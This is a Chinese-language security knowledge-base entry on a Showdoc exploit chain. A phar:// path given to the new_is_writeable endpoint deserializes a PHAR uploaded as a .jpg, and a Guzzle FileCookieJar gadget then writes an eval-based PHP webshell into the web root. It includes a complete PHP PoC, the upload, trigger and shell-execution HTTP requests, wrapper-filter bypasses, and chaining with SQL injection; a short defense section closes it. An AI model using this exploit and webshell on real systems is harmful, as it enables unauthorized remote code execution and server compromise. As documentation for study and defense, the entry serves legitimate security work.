---
id: web-php-deserialization-showdoc-new-is-writeable-phar-guzzle-filecookiejar-webshell
title: Showdoc new_is_writeable 的 file 参数 phar:// 触发反序列化：Guzzle FileCookieJar 析构写 cookie 文件 getshell
type: scenario
domain: web
path: web/php/deserialization
technique: showdoc-new-is-writeable-phar-guzzle-filecookiejar-file-write
tags:
- php
- phar
- deserialization
- showdoc
- guzzle
- file-write
- webshell
- pop-chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V342
  verified_at: '2026-11-08T20:51:22+08:00'
  notes: 已对照原文及18张图片核对：上传白名单 isAllowedFilename 仅校验扩展名；Guzzle 存在于 vendor；PHAR 以 shell.jpg 上传、user_token 鉴权；shell.php 落盘内容为 [{"Expires":"<?php eval([0]);?>"}] 并可执行 phpinfo；触发路径 new_is_writeable&file=phar:// 与原文一致。3.2.5 仅为演示环境版本，原文未给出明确受影响区间，已 --clear。未本机实测。
url: /docs/web/php/deserialization/web-php-deserialization-showdoc-new-is-writeable-phar-guzzle-filecookiejar-webshell/
draft: false
kb_aliases:
- Showdoc PHAR 反序列化
- new_is_writeable phar 触发
- GuzzleHttp FileCookieJar gadget
- FileCookieJar __destruct 任意文件写
- phar 改名 jpg 上传 getshell
---

## 一句话结论

Showdoc 的 `/server/index.php?s=/home/index/new_is_writeable&file=` 会对用户传入的路径做文件操作，攻击者可用 `phar://` 包装器让它解析上传文件中的 PHAR metadata 触发反序列化；把带 GuzzleHttp\Cookie\FileCookieJar 元数据的 PHAR 改名 `.jpg` 上传后，`FileCookieJar::__destruct → save($filename)` 会把伪造 Cookie 的 JSON 写到 Web 目录下的 `shell.php`，SetCookie 的 `Expires` 字段携带 `<?php eval($_POST[0]);?>`，请求该文件即执行任意 PHP。

## 原理

- **PHAR 反序列化**：访问 `phar://` 路径时，PHP 会解析 PHAR manifest 并自动 `unserialize()` 其中的 metadata（演示环境 PHP 7.4.33 的默认行为）。`new_is_writeable` 对 `file` 参数做 `is_writable()` 之类的文件操作，路径完全来自请求，传入 `phar://<上传文件路径>` 即把"文件存在性检查"变成反序列化触发器，不需要 `include`。
- **为什么能上传 PHAR**：上传接口只按扩展名白名单判断（`isAllowedFilename` 允许 `.jpg/.jpeg/.png/...` 等），不检查真实文件类型；PHAR 的 stub 写成 `GIF89a<?php __HALT_COMPILER(); ?>` 可同时满足"图片头"与 PHAR 格式要求，客户端把生成好的 `shell.phar` 以 `shell.jpg` 文件名提交即可落地。
- **Guzzle FileCookieJar 文件写入 gadget**：`GuzzleHttp\Cookie\FileCookieJar` 继承 `CookieJar`，析构函数 `__destruct()` 直接调用 `save($this->filename)`；`save()` 遍历 `$this->cookies`，对每个 Cookie 调 `toArray()` 后 `json_encode` 并用 `file_put_contents()` 写入 `$filename`。反序列化时 `$filename` 与 `$cookies` 都由 metadata 控制：`$filename` 指向 Web 根目录（如 `/var/www/html/shell.php`），`SetCookie` 的私有 `$data` 里放 `'Expires' => '<?php eval($_POST[0]);?>'`，写入的 JSON 形如 `[{"Expires":"<?php eval($_POST[0]);?>"}]`——PHP 解析该文件时会原样输出 JSON 文本并执行其中的 `<?php ... ?>` 段，于是 `shell.php` 成为可用 `0` 参数执行任意代码的 WebShell。
- **前置鉴权**：`/api/page/upload` 需要登录（未携带有效 token 返回「你尚未登录」，`error_code=10102`），链路中通过 SQL 注入拿到 `user_token` 后作为 `user_token` 参数（或 `cookie_token` Cookie）带上即可；任意已有账号同样满足此条件。

## 触发条件

- 目标为 Showdoc 3.2.5（演示版本）且运行在会自动反序列化 PHAR metadata 的 PHP 版本（PHP 7.4 等）。
- 已获得登录态或有效 `user_token`（可由 Showdoc SQL 注入获取，或任意账号）。
- PHP 进程对 Web 根目录有写权限（官方 Docker 镜像默认 `/var/www/html` 可写）。
- Web 服务器允许执行上传目录链路之外被写入的 `.php` 文件；上传后的 PHAR 文件路径可被 `phar://` 相对路径定位（文件库/上传响应可得到文件名）。

## 利用步骤

1. 本地生成 PHAR（`phar.readonly=0`），metadata 为 Guzzle FileCookieJar，filename 指向 Web 根下的 `shell.php`，cookies 内含 SetCookie，其 `Expires` 为 PHP 代码；stub 前置 `GIF89a`。生成后把 `shell.phar` 改名为 `shell.jpg`。
2. 携带 `user_token`（或登录 Cookie）向 `POST /server/index.php?s=/api/page/upload` 提交 multipart，表单字段 `user_token=<token>`、`file=@shell.jpg`（Content-Type: image/jpeg）。
3. 从上传响应或文件库得到落地路径（如 `Public/Uploads/<日期>/<hash>.jpg`）。
4. 携带登录态访问触发接口：`GET /server/index.php?s=/home/index/new_is_writeable&file=phar://../Public/Uploads/<日期>/<hash>.jpg`，文件操作使 PHAR metadata 反序列化，析构时写出 `shell.php`。
5. 访问 `POST /shell.php`，body `0=phpinfo();`（或 `0=system('id');`）验证命令执行。

## PoC

```php
<?php
namespace GuzzleHttp\Cookie {
    class CookieJar {
        private $cookies;
        private $strictMode;
        public function __construct() { $this->cookies = array(new SetCookie()); }
    }
    class FileCookieJar extends CookieJar {
        private $filename = "/var/www/html/shell.php";
        private $storeSessionCookies = true;
    }
    class SetCookie {
        private $data = array('Expires' => '<?php eval($_POST[0]);?>');
    }
}
namespace {
    $phar = new Phar("shell.phar");          // 生成时后缀 .phar，上传时改名 .jpg
    $phar->startBuffering();
    $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata(new \GuzzleHttp\Cookie\FileCookieJar());
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
}
```

```http
POST /server/index.php?s=/api/page/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="user_token"

<SQL 注入得到的 user_token>
------boundary
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

<shell.phar 的二进制内容>
------boundary--
```

```http
GET /server/index.php?s=/home/index/new_is_writeable&file=phar://../Public/Uploads/2024-06-05/<hash>.jpg HTTP/1.1
Cookie: PHPSESSID=<会话>; user_token=<token>
```

```http
POST /shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

0=system('id');
```

## 变体与关联

- **触发 sink 扩展**：任何对用户可控路径执行 `file_exists/is_writable/getimagesize/fileowner/filesize` 等文件函数的地方都可替代 `new_is_writeable` 触发 `phar://`；若目标做了 `phar://` 前缀过滤，可尝试 `php://filter/resource=phar://...`、`compress.zlib://` 等包装器绕过。
- **gadget 扩展**：同一入口可换用其他"析构写文件/执行回调"的链（如 Guzzle FnStream 析构调用任意函数、各类日志/缓存写文件 POP 链）；FileCookieJar 链的优点是不依赖 RCE 类 gadget，只要目标 vendor 存在 Guzzle 即可写文件。
- **上传绕过**：扩展名白名单下用 `.jpg` + GIF89a stub；若目标校验图片内容，可对 PHAR 做图片二次封装或使用其他托管路径。
- **关联**：与 Showdoc SQL 注入链衔接构成"未授权注入 → token → 上传 → PHAR → WebShell"的完整利用链；SQL 注入仅用于取得登录态，PHAR 部分在拿到任意账号后同样成立。

## 检测与防御

- 对用户可控路径的文件操作拒绝所有流包装器：先 `parse_url`/`str_contains` 拒绝 `phar://`、`php://`、`compress.*://` 等，再 `realpath()` 限定在允许目录内；不要对原始输入直接 `is_writable`。
- 上传目录禁止 PHP 执行（Nginx/Apache 对 `/Public/Uploads` 关闭脚本解析），并把上传文件存到 Web 根之外；对图片做真实解码重编码，彻底破坏 PHAR 结构。
- 升级到受支持 PHP 版本并跟进 PHAR metadata 反序列化的缓解行为；生产环境 `phar.readonly=1`（只影响生成，读取仍需防护）。
- 修复 SQL 注入与 token 泄露，避免攻击者获得上传所需登录态；监控 Web 根目录新增 PHP 文件与 `phar://` 相关请求参数。

